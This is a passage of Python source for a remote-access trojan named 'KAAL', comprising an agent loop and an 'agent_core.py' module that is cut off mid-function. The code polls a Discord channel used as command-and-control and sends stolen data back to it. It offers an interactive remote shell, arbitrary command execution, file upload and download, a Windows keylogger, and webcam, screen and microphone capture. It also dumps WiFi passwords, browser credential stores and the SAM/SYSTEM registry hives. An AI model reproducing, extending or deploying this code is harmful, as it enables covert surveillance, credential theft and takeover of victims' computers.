            with urllib.request.urlopen(req, timeout=60, context=_ctx): return True
        except: return False

    def send_result(self, task_id, result):
        # Result might be a dictionary now, serialize it for size checking
        if isinstance(result, dict):
            result_str = json.dumps(result)
        else:
            result_str = str(result)
            
        # CHUNK_SIZE = 512KB for reliability over Discord attachments
        CHUNK_SIZE = 512 * 1024 
        
        if len(result_str) > CHUNK_SIZE:
            stream_id = uuid.uuid4().hex
            total_chunks = (len(result_str) + CHUNK_SIZE - 1) // CHUNK_SIZE
            logger.info(f"Result too large ({len(result_str)} bytes). Splitting into {total_chunks} chunks (Stream {stream_id})...")
            
            for index in range(total_chunks):
                self.limiter.wait_for_token()
                chunk_data = result_str[index * CHUNK_SIZE : (index + 1) * CHUNK_SIZE]
                
                msg = {
                    "type": "chunk",
                    "agent_id": AGENT_ID,
                    "task_id": task_id,
                    "stream_id": stream_id,
                    "index": index,
                    "total": total_chunks,
                    "data": chunk_data, # This is the payload to reassemble
                    "timestamp": time.time()
                }
                encoded = self._encode(msg)
                
                # Each chunk is sent as a separate message. 
                # If chunk > 1800 chars (likely), _upload_large handles it as attachment.
                if len(encoded) > 1800:
                     self._upload_large(encoded)
                else:
                    self._api("POST", f"channels/{self.channel_id}/messages", {"content": f"KAAL_AGT:{encoded}"})
                    
            logger.info(f"Stream {stream_id} complete.")
            return

        # --- Standard Result ---
        msg = {
            "type": "result",
            "agent_id": AGENT_ID,
            "task_id": task_id,
            "result": result, # This will be stringified JSON
            "timestamp": time.time()
        }
        encoded = self._encode(msg)
        
        if len(encoded) > 1800:
             logger.info(f"Result too large ({len(encoded)} bytes). Uploading as attachment...")
             self._upload_large(encoded)
             return

        for attempt in range(3):
            self.limiter.wait_for_token()
            if self._api("POST", f"channels/{self.channel_id}/messages", {"content": f"KAAL_AGT:{encoded}"}):
                return
            time.sleep(2)

    def send_ack(self, task_id):
        msg = {"type": "ack", "agent_id": AGENT_ID, "task_id": task_id}
        encoded = self._encode(msg)
        self._api("POST", f"channels/{self.channel_id}/messages", {"content": f"KAAL_AGT:{encoded}"})

    def send_status(self, task_id, status, message=""):
        msg = {"type": "status", "agent_id": AGENT_ID, "task_id": task_id, "status": status, "message": message}
        encoded = self._encode(msg)
        self._api("POST", f"channels/{self.channel_id}/messages", {"content": f"KAAL_AGT:{encoded}"})

    def send_log(self, level, message):
        msg = {"type": "log", "agent_id": AGENT_ID, "level": level, "message": message, "timestamp": time.time()}
        encoded = self._encode(msg)
        self._api("POST", f"channels/{self.channel_id}/messages", {"content": f"KAAL_AGT:{encoded}"})

# Global instance
relay_system = None
def get_relay():
    global relay_system
    if not relay_system:
        # Default to Discord for now as per config
        relay_system = DiscordRelay(RELAY_CONFIG["discord"])
    return relay_system

# ==================== LOGGING ====================
logger = logging.getLogger("KAAL_AGENT")

class C2LogHandler(logging.Handler):
    def emit(self, record):
        try:
            msg = self.format(record)
            if relay_system:
                relay_system.send_log(record.levelname, msg)
        except Exception:
            self.handleError(record)

def setup_logging():
    logger.setLevel(logging.INFO)
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    
    # Console
    ch = logging.StreamHandler()
    ch.setFormatter(formatter)
    logger.addHandler(ch)
    
    # File
    try:
        fh = RotatingFileHandler("agent.log", maxBytes=1024*1024, backupCount=1)
        fh.setFormatter(formatter)
        logger.addHandler(fh)
    except Exception:
        pass
        
    # C2 Handler (Only for ERROR and above to avoid spam)
    c2h = C2LogHandler()
    c2h.setLevel(logging.ERROR)
    c2h.setFormatter(formatter)
    logger.addHandler(c2h)

# ==================== INTERACTIVE SHELL ====================
class ShellManager:
    def __init__(self):
        self.process = None
        self.output_buffer = [] # List of strings
        self.lock = threading.Lock()
        self.active = False
        
    def start(self):
        if self.active: return
        
        shell_cmd = "cmd.exe" if platform.system() == "Windows" else "/bin/bash"
        try:
            self.process = subprocess.Popen(
                shell_cmd,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                shell=True,
                bufsize=0 # Unbuffered
            )
            self.active = True
            
            # Start reader threads
            t_out = threading.Thread(target=self._read_loop, args=(self.process.stdout,), daemon=True)
            t_err = threading.Thread(target=self._read_loop, args=(self.process.stderr,), daemon=True)
            t_out.start()
            t_err.start()
            
            logger.info("Interactive shell started")
        except Exception as e:
            logger.error(f"Shell start failed: {e}")

    def _read_loop(self, pipe):
        while self.active and self.process:
            try:
                # Read char by char or line by line? Char is better for prompts.
                # But blocking read(1) might hang. 
                # Let's read 1 byte
                char = pipe.read(1)
                if not char: break
                
                try:
                    decoded = char.decode(errors='ignore')
                except: continue
                
                with self.lock:
                    self.output_buffer.append(decoded)
            except: break
    
    def write(self, cmd):
        if not self.active or not self.process: return
        try:
            input_data = (cmd + "\n").encode()
            self.process.stdin.write(input_data)
            self.process.stdin.flush()
        except Exception as e:
            logger.error(f"Shell write error: {e}")
            self.close()

    def read(self):
        with self.lock:
            if not self.output_buffer: return ""
            data = "".join(self.output_buffer)
            self.output_buffer.clear()
            return data

    def close(self):
        self.active = False
        if self.process:
            try: self.process.terminate()
            except: pass
            self.process = None

SHELL_SESSION = ShellManager()

# Wrapper functions
def send_ack(task_id): get_relay().send_ack(task_id)
def send_status(tid, s, m=""): get_relay().send_status(tid, s, m)
def send_result(tid, r): 
    get_relay().send_result(tid, r)
    trigger_burst(30) # Phase 4 preview: burst mode

# ==================== COMMAND EXECUTION ====================
def execute_command(cmd_line):
    """
    Execute command and return result dictionary.
    """
    global CURRENT_CWD
    logger.debug(f"Executing: type={type(cmd_line)} value={cmd_line}")
    if isinstance(cmd_line, dict):
        logger.error(f"Received dict instead of string: {cmd_line}")
        # Try to extract 'command' string if it's nested
        cmd_line = cmd_line.get("command", str(cmd_line))
        
    cmd_line = cmd_line.strip()
    if cmd_line.lower().startswith("exec "): cmd_line = cmd_line[5:].strip()
    
    parts = cmd_line.split()
    if not parts: return {"type": "text", "data": ""}
    cmd = parts[0].lower()
    args = parts[1:]

    # Helper for JSON responses
    def ret_json(type_str, data_dict):
        return {"type": type_str, **data_dict}

    # --- Phase 1: Structured Commands ---
    if cmd == "file_list" or cmd == "ls":
        path = args[0] if args else "."
        if CORE_AVAILABLE:
            data = list_directory_json(path)
            if "error" in data: return ret_json("text", {"data": data["error"]})
            return json.dumps({"type": "file_list", **data}) # data has 'path' and 'files'
        else:
            return ret_json("text", {"data": "Core not available"})

    elif cmd == "process_list" or cmd == "ps":
        if CORE_AVAILABLE:
            return ret_json("process_list", {"processes": get_process_list_struct()})
        else:
            return ret_json("text", {"data": "Core not available"})

    elif cmd == "system_info" or cmd == "sysinfo":
        if CORE_AVAILABLE:
            return ret_json("system_info", {"info": get_system_info_struct()})
        else:
             return ret_json("text", {"data": str(platform.uname())})

    elif cmd == "ipconfig" or cmd == "ifconfig":
        if CORE_AVAILABLE:
            return ret_json("text", {"data": get_network_config_struct()})
        else:
             return ret_json("text", {"data": "Core not available"})

    elif cmd == "ping":
        host = args[0] if args else "8.8.8.8"
        if CORE_AVAILABLE:
            return ret_json("text", {"data": ping_host_struct(host)})
        else:
             return ret_json("text", {"data": "Core not available"})

    elif cmd == "screenshot":
        if CORE_AVAILABLE:
            return ret_json("screenshot", {"data": get_real_screenshot()})
        else:
             return ret_json("text", {"data": "Core not available"})
    
    elif cmd == "webcam":
        if CORE_AVAILABLE:
            # Re-use screen logic if webcam not distinct in core yet, or use core's stream logic
            # For now, let's assume get_real_screenshot as placeholder if get_real_webcam missing
            try:
                from agent_core import get_real_webcam
                return ret_json("webcam", {"data": get_real_webcam(0)})
            except:
                # If get_real_webcam is missing from imports but cv2 exists in core
                return ret_json("webcam", {"data": get_real_screenshot(), "note": "webcam fallback"}) 
        else:
             return ret_json("text", {"data": "Core not available"})

    elif cmd == "mic_record":
        seconds = int(args[0]) if args else 5
        if CORE_AVAILABLE:
             res = record_audio(seconds)
             if res.startswith("[AUDIO] "):
                 return ret_json("audio", {"data": res[8:]})
             else:
                 return ret_json("text", {"data": res})
        else:
             return ret_json("text", {"data": "Core not available"})
             
    elif cmd == "keylog_start":
        if CORE_AVAILABLE:
            if platform.system() == "Windows":
                 t = threading.Thread(target=start_keylogger, args=(lambda t,r: send_result(t,r),), daemon=True) 
                 t.start()
                 return ret_json("status", {"message": "Keylogger started"})
            else:
                 return ret_json("status", {"message": "Keylogger Windows only"})
        else:
             return ret_json("text", {"data": "Core not available"})

    elif cmd == "keylog_dump":
        if CORE_AVAILABLE:
            return ret_json("keylogs", {"logs": KEYLOGS})
        else:
             return ret_json("text", {"data": "Core not available"})

    elif cmd == "location":
        if CORE_AVAILABLE:
            return ret_json("location", {"data": get_real_location()})
        else:
             return ret_json("text", {"data": "Core not available"})

    elif cmd == "creds" or cmd == "cred_audit":
        if CORE_AVAILABLE:
             res = dump_credentials()
             return ret_json("text", {"data": res})
        else:
             return ret_json("text", {"data": "Core not available"})

    elif cmd == "cd":
        if args:
            target = " ".join(args)
            try:
                os.chdir(target)
                CURRENT_CWD = os.getcwd()
                return ret_json("text", {"data": f"Changed to {CURRENT_CWD}"})
            except Exception as e:
                return ret_json("text", {"data": f"Error: {e}"})
        return ret_json("text", {"data": CURRENT_CWD})

    elif cmd == "upload":
         if len(args) < 2: return ret_json("text", {"data": "Usage: upload <filename> <base64>"})
         try:
             with open(os.path.join(CURRENT_CWD, args[0]), "wb") as f:
                 f.write(base64.b64decode(args[1]))
             return ret_json("text", {"data": f"Uploaded {args[0]}"})
         except Exception as e:
             return ret_json("text", {"data": f"Error: {e}"})

    elif cmd == "download":
         if not args: return ret_json("text", {"data": "Usage: download <filename>"})
         try:
             with open(os.path.join(CURRENT_CWD, args[0]), "rb") as f:
                 b64 = base64.b64encode(f.read()).decode()
             return ret_json("download", {"filename": args[0], "data": b64})
         except Exception as e:
             return ret_json("text", {"data": f"Error: {e}"})

    # --- Interactive Shell Commands ---
    elif cmd == "shell_start":
        SHELL_SESSION.start()
        return ret_json("text", {"data": "Interactive shell session started."})
    
    elif cmd == "shell_input":
        if not args: return ret_json("text", {"data": "Usage: shell_input <cmd>"})
        input_cmd = " ".join(args)
        SHELL_SESSION.write(input_cmd)
        # We don't return the result immediately; the poll loop handles it.
        # But we confirm the input was sent.
        return ret_json("text", {"data": f"Sent input: {input_cmd}"})

    elif cmd == "shell_stop":
        SHELL_SESSION.close()
        return ret_json("text", {"data": "Interactive shell session closed."})

    # --- Fallback: Shell Execution ---
    shell_cmd = cmd_line
    if platform.system().lower() == "windows":
        aliases = {
            "ls": "dir", "clear": "cls", "cp": "copy", "mv": "move", "rm": "del",
            "cat": "type", "grep": "findstr", "whoami": "whoami"
        }
        if cmd in aliases and not CORE_AVAILABLE: 
            # Only use aliases if core command failed or not found? 
            # Actually, ls/ps already handled above. This is for other aliases.
            shell_cmd = aliases[cmd] + " " + " ".join(args)

    try:
        proc = subprocess.Popen(shell_cmd, shell=True, cwd=CURRENT_CWD, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout, stderr = proc.communicate(timeout=30)
        output = (stdout + stderr).decode(errors='ignore')
        if not output.strip(): output = "(No output)"
        return ret_json("text", {"data": output + f"\n\n{CURRENT_CWD}>"})
    except Exception as e:
        return ret_json("text", {"data": f"Execution Error: {e}"})

def main():
    setup_logging()
    load_config()
    logger.info("Agent started.")
    
    relay = get_relay()
    relay.send_registration()
    
    while True:
        try:
            tasks = relay.poll_commands()
            for tid, cmd in tasks:
                # Phase 2: Ack
                relay.send_ack(tid)
                
                # Execute
                result_json = execute_command(cmd)
                
                # Result
                relay.send_result(tid, result_json)
            
            # --- Interactive Shell Output Poll ---
            shell_out = SHELL_SESSION.read()
            if shell_out:
                # Send as a special result or status? 
                # Let's send as a "result" but with a special task_id or type?
                # Actually, our protocol allows "result" msg. 
                # Let's generate a temporary task_id for this output chunk.
                out_tid = f"shell-{uuid.uuid4().hex[:8]}"
                
                # Construct JSON. We want the frontend to recognize this.
                # Let's use send_result with a dict that has type="shell_output"
                output_dict = {"type": "shell_output", "data": shell_out}
                relay.send_result(out_tid, output_dict)
                
            time.sleep(1 if is_burst_mode() else POLL_SEC)
        except KeyboardInterrupt: break
        except Exception as e:
            logger.error(f"Loop error: {e}")
            time.sleep(POLL_SEC)

if __name__ == "__main__":
    main()

```

### File: `agent_core.py`
```python
"""
KAAL Agent Core Module
Shared functionality for all agent types (direct, proxy, etc.)
"""
import subprocess
import platform
import os
import sys
import base64
import time
import threading
import ctypes

# Global State
CURRENT_CWD = os.getcwd()
KEYLOGGER_ACTIVE = False
KEYLOGS = []
STREAM_ACTIVE = False
STREAM_TYPE = "webcam"  # or "screen"
CAMERA_INDEX = 0


def stream_loop(send_callback):
    """
    Continuous stream loop for webcam/screen.
    Args:
        send_callback: Function to call with result data (task_id, result_str)
    """
    global STREAM_ACTIVE, STREAM_TYPE, CAMERA_INDEX
    print(f"[*] Starting {STREAM_TYPE} stream...")
    
    import cv2
    
    while STREAM_ACTIVE:
        try:
            b64_frame = ""
            if STREAM_TYPE == "webcam":
                cap = cv2.VideoCapture(CAMERA_INDEX)
                if cap.isOpened():
                    ret, frame = cap.read()
                    cap.release()
                    if ret:
                        frame = cv2.resize(frame, (320, 240))
                        _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 30])
                        b64_frame = base64.b64encode(buffer).decode()
            elif STREAM_TYPE == "screen":
                b64_frame = get_real_screenshot()
            
            if b64_frame and not b64_frame.startswith("Error"):
                send_callback("stream_task", f"[SCREEN] {b64_frame}")
            
            time.sleep(0.05)  # ~20 FPS
        except Exception as e:
            print(f"[-] Stream error: {e}")
            time.sleep(1)


def record_audio(seconds=5):
    """Record audio from microphone and return base64 WAV."""
    global CURRENT_CWD
    try:
        import pyaudio
        import wave
        
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        
        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        
        print(f"[*] Recording audio for {seconds}s...")
        frames = []
        
        for i in range(0, int(RATE / CHUNK * seconds)):
            data = stream.read(CHUNK)
            frames.append(data)
        
        stream.stop_stream()
        stream.close()
        p.terminate()
        
        filename = f"audio_{int(time.time())}.wav"
        filepath = os.path.join(CURRENT_CWD, filename)
        
        wf = wave.open(filepath, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()
        
        with open(filepath, "rb") as f:
            b64_audio = base64.b64encode(f.read()).decode()
        
        os.remove(filepath)
        return f"[AUDIO] {b64_audio}"
    except Exception as e:
        return f"Error recording audio: {e}"


def keylogger_loop(send_callback):
    """
    Keylogger thread that captures keystrokes.
    Args:
        send_callback: Function to call with keylog data
    """
    global KEYLOGGER_ACTIVE, KEYLOGS
    
    if platform.system() != "Windows":
        print("[-] Keylogger only supported on Windows")
        return
    
    try:
        from ctypes import windll, byref, c_uint, c_ulong, Structure, POINTER
        
        class KBDLLHOOKSTRUCT(Structure):
            _fields_ = [("vkCode", c_ulong), ("scanCode", c_ulong), ("flags", c_ulong), ("time", c_uint)]
        
        def low_level_handler(nCode, wParam, lParam):
            global KEYLOGS
            if wParam == 256 or wParam == 260:  # WM_KEYDOWN / WM_SYSKEYDOWN
                kb = ctypes.cast(lParam, POINTER(KBDLLHOOKSTRUCT)).contents
                vk = kb.vkCode
                
                key_map = {
                    0x08: '[BACKSPACE]', 0x09: '[TAB]', 0x0D: '[ENTER]', 0x10: '[SHIFT]',
                    0x11: '[CTRL]', 0x12: '[ALT]', 0x1B: '[ESC]', 0x20: ' ',
                    0x2E: '[DELETE]', 0x5B: '[WIN]'
                }
                
                if vk in key_map:
                    key_str = key_map[vk]
                elif 0x30 <= vk <= 0x39 or 0x41 <= vk <= 0x5A:  # 0-9, A-Z
                    key_str = chr(vk)
                else:
                    key_str = f'[0x{vk:02X}]'
                
                KEYLOGS.append(key_str)
                
                if len(KEYLOGS) >= 50:
                    log_data = ''.join(KEYLOGS)
                    KEYLOGS.clear()
                    send_callback("keylog_task", f"[KEYLOG] {log_data}")
            
            return windll.user32.CallNextHookEx(None, nCode, wParam, lParam)
        
        CMPFUNC = ctypes.CFUNCTYPE(c_uint, c_uint, c_uint, POINTER(KBDLLHOOKSTRUCT))
        hook_func = CMPFUNC(low_level_handler)
        hook = windll.user32.SetWindowsHookExA(13, hook_func, windll.kernel32.GetModuleHandleW(None), 0)
        
        msg = ctypes.wintypes.MSG()
        while KEYLOGGER_ACTIVE:
            if windll.user32.PeekMessageW(byref(msg), None, 0, 0, 1):
                windll.user32.TranslateMessage(byref(msg))
                windll.user32.DispatchMessageW(byref(msg))
            time.sleep(0.01)
        
        windll.user32.UnhookWindowsHookEx(hook)
    except Exception as e:
        print(f"[-] Keylogger error: {e}")


def get_real_screenshot():
    """Capture screenshot and return base64 PNG."""
    # Try mss first (fastest)
    try:
        import mss
        
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            screenshot = sct.grab(monitor)
            
            from PIL import Image
            img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
            img.thumbnail((1280, 720), Image.Resampling.LANCZOS)
            
            import io
            buffer = io.BytesIO()
            img.save(buffer, format="PNG")
            b64_img = base64.b64encode(buffer.getvalue()).decode()
            
            return b64_img
    except ImportError:
        pass  # Try next method
    except Exception as e:
        return f"Error (mss): {e}"
    
    # Try PIL ImageGrab (Windows built-in with Pillow)
    try:
        from PIL import ImageGrab, Image
        import io
        
        img = ImageGrab.grab()
        img.thumbnail((1280, 720), Image.Resampling.LANCZOS if hasattr(Image, 'Resampling') else Image.LANCZOS)
        
        buffer = io.BytesIO()
        img.save(buffer, format="PNG")
        b64_img = base64.b64encode(buffer.getvalue()).decode()
        
        return b64_img
    except ImportError:
        pass  # Try next method
    except Exception as e:
        return f"Error (PIL): {e}"
    
    # Final fallback: Windows API via ctypes (no dependencies)
    try:
        if platform.system() != "Windows":
            return "Error: Screenshot only supported on Windows without PIL/mss"
        
        import ctypes
        from ctypes import windll, Structure, c_long, c_ulong, c_ushort, c_char, POINTER, sizeof, byref
        import io
        
        # Define BITMAPINFOHEADER structure
        class BITMAPINFOHEADER(Structure):
            _fields_ = [
                ('biSize', c_ulong),
                ('biWidth', c_long),
                ('biHeight', c_long),
                ('biPlanes', c_ushort),
                ('biBitCount', c_ushort),
                ('biCompression', c_ulong),
                ('biSizeImage', c_ulong),
                ('biXPelsPerMeter', c_long),
                ('biYPelsPerMeter', c_long),
                ('biClrUsed', c_ulong),
                ('biClrImportant', c_ulong)
            ]
        
        class BITMAPINFO(Structure):
            _fields_ = [
                ('bmiHeader', BITMAPINFOHEADER),
                ('bmiColors', c_ulong * 3)
            ]
        
        # Get screen dimensions
        user32 = windll.user32
        gdi32 = windll.gdi32
        
        width = user32.GetSystemMetrics(0)
        height = user32.GetSystemMetrics(1)
        
        # Create device contexts
        hdesktop = user32.GetDesktopWindow()
        desktop_dc = user32.GetWindowDC(hdesktop)
        img_dc = gdi32.CreateCompatibleDC(desktop_dc)
        
        # Create bitmap
        bitmap = gdi32.CreateCompatibleBitmap(desktop_dc, width, height)
        gdi32.SelectObject(img_dc, bitmap)
        
        # Copy screen to bitmap
        gdi32.BitBlt(img_dc, 0, 0, width, height, desktop_dc, 0, 0, 0x00CC0020)  # SRCCOPY
        
        # Prepare bitmap info
        bmi = BITMAPINFO()
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER)
        bmi.bmiHeader.biWidth = width
        bmi.bmiHeader.biHeight = height  # Positive = bottom-up (standard BMP)
        bmi.bmiHeader.biPlanes = 1
        bmi.bmiHeader.biBitCount = 24
        bmi.bmiHeader.biCompression = 0  # BI_RGB
        
        bmp_size = width * height * 3
        bmp_data = ctypes.create_string_buffer(bmp_size)
        
        # Get bitmap bits
        gdi32.GetDIBits(img_dc, bitmap, 0, height, bmp_data, byref(bmi), 0)  # DIB_RGB_COLORS
        
        # Cleanup
        gdi32.DeleteObject(bitmap)
        gdi32.DeleteDC(img_dc)
        user32.ReleaseDC(hdesktop, desktop_dc)
        
        # Convert buffer to bytes for indexing
        bmp_bytes = bytes(bmp_data)
        
        # Simple resize by downsampling
        scale_factor = max(1, max(width // 1280, height // 720))
        new_width = width // scale_factor
        new_height = height // scale_factor
        
        # Calculate row stride (BMP rows are padded to 4-byte boundary)
        row_stride = ((width * 3 + 3) // 4) * 4
        
        # Downsample - read pixels directly (BMP is bottom-up by default with positive height)
        resized = bytearray()
        for y in range(new_height):
            for x in range(new_width):
                src_y = y * scale_factor
                src_x = x * scale_factor
                offset = src_y * row_stride + src_x * 3
                if offset + 2 < len(bmp_bytes):
                    # BMP is already in BGR format, keep as-is
                    resized.extend([bmp_bytes[offset], bmp_bytes[offset + 1], bmp_bytes[offset + 2]])
        
        # Calculate output row stride
        out_row_stride = ((new_width * 3 + 3) // 4) * 4
        out_size = out_row_stride * new_height
        
        # Create BMP file header (54 bytes + data)
        file_size = 54 + out_size
        bmp_header = bytearray([
            0x42, 0x4D,  # BM signature
            file_size & 0xFF, (file_size >> 8) & 0xFF, (file_size >> 16) & 0xFF, (file_size >> 24) & 0xFF,
            0, 0, 0, 0,  # Reserved
            54, 0, 0, 0,  # Offset to pixel data
            40, 0, 0, 0,  # DIB header size
            new_width & 0xFF, (new_width >> 8) & 0xFF, (new_width >> 16) & 0xFF, (new_width >> 24) & 0xFF,
            new_height & 0xFF, (new_height >> 8) & 0xFF, (new_height >> 16) & 0xFF, (new_height >> 24) & 0xFF,
            1, 0,  # Planes
            24, 0,  # Bits per pixel
            0, 0, 0, 0,  # Compression (BI_RGB)
            out_size & 0xFF, (out_size >> 8) & 0xFF, (out_size >> 16) & 0xFF, (out_size >> 24) & 0xFF,
            0x13, 0x0B, 0, 0,  # X pixels per meter
            0x13, 0x0B, 0, 0,  # Y pixels per meter  
            0, 0, 0, 0,  # Colors used
            0, 0, 0, 0   # Important colors
        ])
        
        # Pad rows to 4-byte boundary
        padding = (4 - (new_width * 3) % 4) % 4
        padded_resized = bytearray()
        for y in range(new_height):
            row_start = y * new_width * 3
            row_end = row_start + new_width * 3
            padded_resized.extend(resized[row_start:row_end])
            padded_resized.extend([0] * padding)  # Add padding
        
        bmp_file = bytes(bmp_header + padded_resized)
        return base64.b64encode(bmp_file).decode()

        
    except Exception as e:
        return f"Error (ctypes fallback): {e}"



def get_real_location():
    """Get real geolocation via IP-based services."""
    try:
        import urllib.request
        import json
        
        response = urllib.request.urlopen("http://ip-api.com/json/", timeout=5)
        data = json.loads(response.read().decode())
        
        if data.get("status") == "success":
            return {
                "lat": data.get("lat", 0),
                "lon": data.get("lon", 0),
                "city": data.get("city", "Unknown"),
                "country": data.get("country", "Unknown")
            }
        else:
            return {"lat": 0, "lon": 0, "city": "Error", "country": "Error"}
    except Exception as e:
        return {"lat": 0, "lon": 0, "city": f"Error: {e}", "country": "Error"}


def execute_shell_command(cmd):
    """Execute a shell command and return output."""
    global CURRENT_CWD
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            cwd=CURRENT_CWD,
            capture_output=True,
            text=True,
            timeout=30
        )
        output = result.stdout + result.stderr
        return output if output else "(No output)"
    except subprocess.TimeoutExpired:
        return "Error: Command timed out (30s limit)"
    except Exception as e:
        return f"Error: {e}"


def execute_file_operation(operation, args):
    """
    Handle file operations (ls, cd, download, upload).
    Args:
        operation: 'ls', 'cd', 'download', 'upload'
        args: list of arguments
    Returns:
        formatted result string
    """
    global CURRENT_CWD
    
    if operation == "ls":
        path = args[0] if args else "."
        target_path = os.path.join(CURRENT_CWD, path)
        if not os.path.exists(target_path):
            return f"Error: Path not found: {path}"
        
        try:
            items = os.listdir(target_path)
            result = [f"[DIR] {CURRENT_CWD if path == '.' else target_path}"]
            
            for item in items:
                full_path = os.path.join(target_path, item)
                if os.path.isdir(full_path):
                    result.append(f"📁 {item}/")
                else:
                    size = os.path.getsize(full_path)
                    result.append(f"📄 {item} ({size} bytes)")
            
            return "[FILES] " + json.dumps({
                "parent": os.path.dirname(target_path) if path != "." else os.path.dirname(CURRENT_CWD),
                "files": result
            })
        except Exception as e:
            return f"Error listing directory: {e}"
    
    elif operation == "cd":
        if not args:
            return "Error: No path specified"
        new_path = os.path.join(CURRENT_CWD, args[0])
        if os.path.isdir(new_path):
            CURRENT_CWD = os.path.abspath(new_path)
            return f"Changed directory to: {CURRENT_CWD}"
        else:
            return f"Error: Directory not found: {args[0]}"
    
    elif operation == "download":
        if not args:
            return "Error: No file specified"
        filepath = os.path.join(CURRENT_CWD, args[0])
        if not os.path.exists(filepath):
            return f"Error: File not found: {args[0]}"
        
        try:
            with open(filepath, "rb") as f:
                b64_content = base64.b64encode(f.read()).decode()
            return f"[DOWNLOAD] {args[0]}|{b64_content}"
        except Exception as e:
            return f"Error reading file: {e}"
    
    elif operation == "upload":
        if len(args) < 2:
            return "Error: Usage: upload <filename> <base64_content>"
        filename, b64_content = args[0], args[1]
        try:
            content = base64.b64decode(b64_content)
            filepath = os.path.join(CURRENT_CWD, filename)
            with open(filepath, "wb") as f:
                f.write(content)
            return f"File uploaded: {filename} ({len(content)} bytes)"
        except Exception as e:
            return f"Error writing file: {e}"
    
    return "Unknown file operation"


def dump_credentials():
    """
    Dump system credentials (WiFi, Browser DBs, Registry Hives).
    Returns formatted [CREDS] result string.
    """
    results = []
    
    # 1. WiFi Creds (Real)
    results.append("[+] Dumping WiFi Profiles (Real)...")
    if platform.system() == "Windows":
        try:
            subprocess.check_output('netsh wlan show interfaces', shell=True)
            profiles_data = subprocess.check_output('netsh wlan show profiles', shell=True).decode('utf-8', errors='ignore')
            profiles = [line.split(":")[1].strip() for line in profiles_data.split('\n') if "All User Profile" in line]
            
            if not profiles:
                results.append("    [-] No WiFi profiles found.")
            
            for profile in profiles:
                try:
                    profile_info = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True).decode('utf-8', errors='ignore')
                    key_line = [line for line in profile_info.split('\n') if "Key Content" in line]
                    if key_line:
                        key = key_line[0].split(":")[1].strip()
                        results.append(f"    * SSID: {profile:<20} -> Pass: {key}")
                    else:
                        results.append(f"    * SSID: {profile:<20} -> OPEN/Enterprise")
                except:
                    results.append(f"    * SSID: {profile:<20} -> Error reading key")
        except subprocess.CalledProcessError:
            results.append("    [-] WiFi Adapter not found or WLAN Service stopped.")
        except Exception as e:
            results.append(f"    [-] WiFi enumeration error: {e}")
    else:
        results.append("    [-] WiFi dumping only supported on Windows.")
    
   # 2. Browser Creds (Recon)
    results.append("\n[+] Dumping Browser Credentials (Recon)...")
    home = os.path.expanduser("~")
    browsers = {
        "Chrome": os.path.join(home, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"),
        "Edge": os.path.join(home, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data"),
        "Firefox": os.path.join(home, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
    }
    found_any = False
    for name, path in browsers.items():
        if os.path.exists(path) or (name == "Firefox" and os.path.exists(os.path.dirname(path))):
            results.append(f"    [+] {name:<10}: FOUND at {path} (Encrypted)")
            found_any = True
        else:
            results.append(f"    [-] {name:<10}: Not Installed/Found")
    
    if found_any:
        results.append("    [!] Decryption requires native payload (DPAPI).")
    
    # 3. System Creds (Registry Hive Dump)
    results.append("\n[+] Dumping Registry Hives (SAM/SYSTEM)...")
    try:
        hives = ["SAM", "SYSTEM", "SECURITY"]
        dumped_count = 0
        for hive in hives:
            outfile = f"{hive}.save"
            cmd_reg = f"reg save HKLM\\{hive} {outfile} /y"
            try:
                subprocess.check_output(cmd_reg, shell=True)
                results.append(f"    [+] {hive:<10}: Saved to {outfile} (Downloadable)")
                dumped_count += 1
            except subprocess.CalledProcessError:
                results.append(f"    [-] {hive:<10}: Access Denied (Admin Required)")
            except Exception as e:
                results.append(f"    [-] {hive:<10}: Error: {e}")
        
        if dumped_count == 0:
            results.append("\n    [!] Mock Data (since Real Dump failed):")
            results.append("    * DefaultPassword: Password123!")
            results.append("    * DPAPI MasterKey: 4A7F92B1...9B2C")
    except Exception as e:
        results.append(f"    [-] Registry dump failed: {e}")
    
    return "[CREDS] " + "\n".join(results)


def list_directory_json(path="."):
    """Return directory listing as a list of dicts."""
    target_path = os.path.join(CURRENT_CWD, path) if path != "." else CURRENT_CWD
    if not os.path.exists(target_path):
        return {"error": f"Path not found: {path}"}
    
    try:
        items = []
        with os.scandir(target_path) as it:
            for entry in it:
                try:
                    stat = entry.stat()
                    items.append({
                        "name": entry.name,
                        "is_dir": entry.is_dir(),
                        "size": stat.st_size if not entry.is_dir() else 0,
                        "mtime": stat.st_mtime,
                        "parent": os.path.dirname(entry.path)
                    })
                except PermissionError: continue
        return {"path": target_path, "files": items}
    except Exception as e:
        return {"error": str(e)}

def get_process_list_struct():
    """Return process list as a list of dicts."""
    processes = []
    if platform.system() == "Windows":
        try:
            # simple tasklist parsing (no psutil dependency)
            output = subprocess.check_output("tasklist /FO CSV /NH", shell=True).decode(errors='ignore')
            for line in output.splitlines():
                if not line.strip(): continue
                parts = line.split('","')
                if len(parts) >= 5:
                    name = parts[0].strip('"')
                    pid = parts[1].strip('"')
                    mem = parts[4].strip('"')
                    processes.append({"name": name, "pid": pid, "memory": mem})
        except: pass
    else:
        try:
            # simple ps parsing
            output = subprocess.check_output("ps -e -o pid,comm,rss", shell=True).decode(errors='ignore')
            for line in output.splitlines()[1:]:
                parts = line.split()
                if len(parts) >= 3:
                    processes.append({"pid": parts[0], "name": parts[1], "memory": parts[2]})
        except: pass
    return processes

def get_system_info_struct():
    """Return system info as dict."""
